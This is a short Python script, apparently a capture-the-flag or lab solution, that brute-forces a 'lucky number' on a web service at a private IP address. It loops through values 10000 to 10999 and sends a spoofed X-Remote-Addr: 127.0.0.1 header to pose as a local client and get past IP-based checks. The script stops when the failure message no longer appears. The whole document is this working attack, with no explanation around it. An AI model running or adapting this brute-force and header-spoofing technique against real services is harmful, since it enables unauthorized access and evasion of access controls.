import requests

for i in range(10000, 11000):
    res = requests.post("http://10.10.47.229:8085/", data={"number":i}, headers={"X-Remote-Addr":"127.0.0.1"})
    print ("Trying : ", i)
    if "Oh no! How unlucky. Spin the wheel and try again." not in res.text:
        print ("Your Lucky Number : ", i)
        print (res.text)
        break
